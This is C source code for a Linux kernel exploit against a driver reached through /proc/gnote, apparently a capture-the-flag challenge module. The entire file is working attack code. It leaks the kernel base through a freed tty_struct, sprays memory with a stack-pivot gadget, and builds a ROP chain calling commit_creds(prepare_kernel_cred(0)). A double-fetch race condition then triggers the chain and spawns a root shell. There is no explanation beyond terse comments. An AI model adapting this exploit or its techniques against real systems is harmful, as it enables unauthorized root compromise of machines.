//$ gcc -O3 -pthread -static -g -masm=intel ./exp.c -o exp
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <syscall.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/user.h>



unsigned long kernel_base,prepare_kernel_cred,commit_creds,xchg_eax_esp_ret, pop_rdi_ret,pop_rsi_ret,mov_rdi_rax_p_ret,pop_rcx,pop_r11,xchg_CR3_sysret;

size_t user_cs, user_ss, user_rflags, user_sp;

struct data {
    unsigned int menu;
    unsigned int arg;
};

int istriggered =0;
int fd;

void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+] Status has been saved!");
}



void race(void *s)
{
    struct data *d=s;
    while(!istriggered){
        d->menu = 0x9000000; // 0xffffffffc0000000 + (0x8000000+0x1000000)*8 = 0x8000000
        puts("[*] race ...");
    }
}


void double_fetch()

{

    struct data race_arg;
    pthread_t pthread;
    race_arg.arg = 0x10001;
    pthread_create(&pthread,NULL, race, &race_arg);
    for (int j=0; j< 0x10000000000; j++)
    {
        race_arg.menu = 1;
        write(fd, (void*)&race_arg, sizeof(struct data));
    }
    pthread_join(pthread, NULL);

}


void shell()
{
    istriggered =1;
    system("/bin/sh");
}

void leak_kernel_address()


{
    int fdp=open("/dev/ptmx", O_RDWR|O_NOCTTY);
    close(fdp);
    sleep(1); // trigger rcu grace period

    struct data d;
    d.menu=1;
    d.arg=0x2e0;  // sizeof(tty_struct) =0x2e0
    write(fd, (char *)&d, sizeof(struct data));

    d.menu=5;
    d.arg = 0;  // select note i -> 0 
    write(fd, (char *)&d, sizeof(struct data));
    char buf[0x100];
    read(fd, buf, 0x100);
    unsigned long leak;
    leak= *(size_t *)(buf+3*8);
    kernel_base = leak - 0xA35360;
    printf("[+] Leak_addr= %p     kernel_base= %p\n", leak , kernel_base);
    
    prepare_kernel_cred = kernel_base + 0x69fe0;
    commit_creds        = kernel_base + 0x69df0;
    xchg_eax_esp_ret    = kernel_base + 0x1992a;  // xchg eax, esp; ret;
    pop_rdi_ret         = kernel_base + 0x1c20d;  // pop rdi; ret;
    pop_rsi_ret         = kernel_base + 0x37799;  // pop rsi; ret; 
    mov_rdi_rax_p_ret   = kernel_base + 0x21ca6a; // cmp rcx, rsi; mov rdi, rax; ja 0x41ca5d; pop rbp; ret;
    pop_rcx             = kernel_base + 0x37523;  // pop rcx ; ret
    pop_r11             = kernel_base + 0x1025c8; // pop r11 ; pop rbp ; ret
    xchg_CR3_sysret     = kernel_base + 0x600116; // mov rdi, cr3 ; or rdi, 0x1000 ; mov cr3, rdi ; pop rax ; pop rdi ; pop rsp ; swapgs ; sysret

}


void prepare_heap_spray()

{
    /* Kernel load minimum address 0xffffffffc0000000 + (0x8000000+0x1000000)*8 = 0x8000000 */
    char *pivot_addr=mmap((void*)0x8000000, 0x1000000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,0);
    unsigned long *spray_addr= (unsigned long *)pivot_addr;
    for (int i=0; i<0x1000000/8; i++)
        spray_addr[i]=xchg_eax_esp_ret;
}


void set_ropchain()


{

    unsigned long mmap_base = xchg_eax_esp_ret & 0xfffff000;
    unsigned long *rop_base = (unsigned long*)(xchg_eax_esp_ret & 0xffffffff);
    char *ropchain = mmap((void *)mmap_base, 0x2000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,0);
    int i=0;

    // commit_creds(prepare_kernel_cred(0))
    rop_base[i++] = pop_rdi_ret;
    rop_base[i++] = 0;
    rop_base[i++] = prepare_kernel_cred;
    rop_base[i++] = pop_rsi_ret;          
    rop_base[i++] = -1;
    rop_base[i++] = mov_rdi_rax_p_ret;
    rop_base[i++] = 0;
    rop_base[i++] = commit_creds;
    // xchg_CR3_sysret
    rop_base[i++] = pop_rcx;
    rop_base[i++] = &shell;
    rop_base[i++] = pop_r11;
    rop_base[i++] = user_rflags;
    rop_base[i++] = 0;
    rop_base[i++] = xchg_CR3_sysret;
    rop_base[i++] = 0;
    rop_base[i++] = 0;
    rop_base[i++] = user_sp;

}


int main()

{   
    // Step 0 : save tatus
    save_status();

    fd=open("proc/gnote", O_RDWR);
    if (fd<0)
    {
        puts("[-] Open driver error!");
        exit(-1);
    }
    
    // Step 1 : leak kernel address
    leak_kernel_address();

    // Step 2 : place heap spray data
    prepare_heap_spray();

    // Step 3 : place ROPchain 
    set_ropchain();

    // Step 4 : double_fetch
    double_fetch();

    return 0;
}

